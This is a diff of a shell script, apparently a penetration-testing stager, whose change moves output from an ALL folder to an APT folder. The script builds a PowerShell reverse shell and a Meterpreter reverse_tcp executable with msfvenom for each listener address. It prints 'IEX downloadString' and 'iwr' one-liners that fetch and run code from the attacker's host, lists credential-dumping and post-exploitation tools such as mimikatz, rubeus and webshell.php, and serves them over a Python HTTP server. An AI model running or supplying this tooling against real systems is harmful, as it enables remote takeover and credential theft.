@@ -22,8 +22,8 @@ cp template.txt reverseshell.ps1
 while read line
   do 
   echo "Invoke-PowerShellTcp -Reverse -IPAddress $line -Port 1234" >> ./reverseshell.ps1
-  mv reverseshell.ps1 ./ALL/reverseshell.ps1
-  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$line LPORT=1234 --platform windows -f exe -o ./ALL/winpayload.exe
+  mv reverseshell.ps1 ./APT/reverseshell.ps1
+  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$line LPORT=1234 --platform windows -f exe -o ./APT/winpayload.exe
 done < $filename
 
 # -------------------------------------------------------------------------------------
@@ -57,19 +57,19 @@ echo "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted\n"
 
 while read line
   do 
-  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:80/reverseshell.ps1)'\""
-  echo "powershell \"iwr -Uri http://$line:80/filename\" -outfile filename"
+  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:80/APT/reverseshell.ps1)'\""
+  echo "powershell \"iwr -Uri http://$line:80/APT/filename\" -outfile filename"
 done < $filename
 
 echo "\nENUMERATION			SHELLS				RUNNING PROCESSES		COMMUNICATIONS			CORE EXPLOITS		"
 echo "----------------------------------------------------------------------------------------------------------------------------------------------------------"
-echo "jawsenum.ps1\"			winpayload.exe\"		\tpowerup.ps1\"			nc64.exe\"			mimidump.ps1\"	"
-echo "sharphound.ps1\"			webshell.php\"			powercat.ps\"			plink64.exe\"			mimikatz.ps1\"		"
-echo "sharphound.exe\"			myshell.php\"			powerview.ps1\"			chisel64.exe\"			winpwn.ps1\"		"
-echo "winpeas32.exe\"			image.php.jpg\"			powermad.ps1\"							lovelypotato.ps1\"	"
-echo "winpeas64.exe\"							procdump32.exe\"						\tmimikatz64.exe\"	"
-echo "rubeus.exe\"							procdump64.exe\"						\tmimikatz32.exe\"	"
-echo "nmapsetup.exe\"																		"
+echo "jawsenum.ps1			winpayload.exe			powerup.ps1			nc64.exe			mimidump.ps1            "
+echo "sharphound.ps1			webshell.php			powercat.ps			plink64.exe			mimikatz.ps1		"
+echo "sharphound.exe			myshell.php			powerview.ps1			chisel64.exe			winpwn.ps1		"
+echo "winpeas32.exe			image.php.jpg			powermad.ps1							lovelypotato.ps1	"
+echo "winpeas64.exe							procdump32.exe							mimikatz64.exe		"
+echo "rubeus.exe							procdump64.exe							mimikatz32.exe		"
+echo "nmapsetup.exe																		"
 echo "----------------------------------------------------------------------------------------------------------------------------------------------------------"
 
 exec python3 -m http.server 80 > output.txt &
